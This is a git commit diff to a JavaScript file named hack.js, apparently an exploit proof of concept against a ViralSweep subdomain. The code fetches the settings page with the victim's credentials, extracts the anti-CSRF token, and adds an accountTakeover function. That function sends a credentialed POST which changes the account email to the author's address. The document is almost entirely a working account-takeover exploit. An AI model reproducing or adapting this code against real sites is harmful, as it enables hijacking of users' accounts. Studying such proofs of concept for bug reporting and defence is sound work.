825cc41b399dcbbd3fd576dc18d5cf00e4ea327c
hacky4594 <hacky4594@gmail.com>
2017-01-18 23:45:24 +0530

    Update hack.js

--- hack.js
+++ hack.js
@@ -1,6 +1,6 @@
 function damm(){
+	
 var http;
-
 http = new XMLHttpRequest();
 http.open("GET","https://hack.viralsweep.com/settings",true);
 http.setRequestHeader('Content-Type','text/plain');
@@ -19,6 +19,20 @@ damm();
 function extractToken(html)
 {
 	s = html.substring(html.indexOf('"token" value="'));
-	t = s.substring(15,s.indexOf('" />'));
-	alert(t);
+	token = s.substring(15,s.indexOf('" />'));
+	alert(token);
+}
+function accountTakeover()
+{
+	var xhr = new XMLHttpRequest();
+        xhr.open("POST", "https://hack.viralsweep.com/settings", true);
+        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
+        xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        xhr.withCredentials = true;
+        var body = "post_type=settings&token="+token+"&email=hacky45.94%40gmail.com";
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i < aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
 }
